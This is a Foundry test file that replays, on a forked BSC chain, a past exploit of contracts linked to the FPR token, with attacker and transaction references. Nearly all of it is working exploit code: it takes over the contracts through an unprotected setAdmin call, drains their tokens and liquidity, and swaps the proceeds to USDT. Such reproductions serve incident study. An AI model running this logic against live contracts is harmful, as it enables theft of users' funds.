// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$29k
// Attacker : https://bscscan.com/address/0xE3104e645BC3f6fD821930a6a39EE509a0E87D3b
// Attack Contract :
// https://bscscan.com/address/0xe3293F89FD3B9336Ac2d514Ec4a90477ca94b0d8
// https://bscscan.com/address/0x5Dd07F8b12B8D5dBDF3664c2Fa7c37Da5048b462
// Attack Tx :
// https://bscscan.com/tx/0xec1b969e1435a1449dd5179404c54b5c60e49f15a1bf6bf8922e8d2978102f4a
// https://bscscan.com/tx/0x1b66170220287bd90f72a97368f8dea2420a24c9585e9f39bf236af6d2a7dde6
// https://bscscan.com/tx/0x43da4322052b045f442cdfc03bcccc797d3bba467beda501222c35d8fd0ebd81
// https://bscscan.com/tx/0x1f8e814029a073c52a8668e6ff5bb3264445a8b29886cc9e3ca8ed5f89ccacd3

// @Analysis
// https://twitter.com/peckshield/status/1603226968706936832
// https://twitter.com/chainlight_io/status/1603282848311480320

interface VulContract {
    function setAdmin(address) external;
    function remaining(address, address) external;
}

contract ContractTest is Test {
    address[4] vulContracts = [
        0x81c5664be54d89E725ef155F14cf34e6213297B7,
        0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532,
        0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3,
        0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27
    ];
    uint256[3] attackBlock = [23_904_153, 23_904_166, 23_904_174];
    IERC20 constant FPR = IERC20(0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Router constant router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IUniswapV2Pair constant pair = IUniswapV2Pair(0x039D05a19e3436c536bE5c814aaa70FcdbDde58b);

    function setUp() public {
        vm.createSelectFork("bsc", 23_904_152);
        vm.label(address(FPR), "FPR token");
        vm.label(address(router), "Router");
        vm.label(address(pair), "Pair");
    }

    function testExploit() public {
        FPR.approve(address(router), type(uint256).max);
        IERC20(address(pair)).approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(FPR);
        path[1] = address(USDT);
        for (uint256 i = 0; i < 3; i++) {
            VulContract(vulContracts[i]).setAdmin(address(this));
            VulContract(vulContracts[i]).remaining(address(this), address(FPR));
            console.log(FPR.balanceOf(address(this)));
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp
            );
        }

        VulContract(vulContracts[3]).setAdmin(address(this));
        VulContract(vulContracts[3]).remaining(address(this), address(pair));
        router.removeLiquidity(
            address(USDT), address(FPR), pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
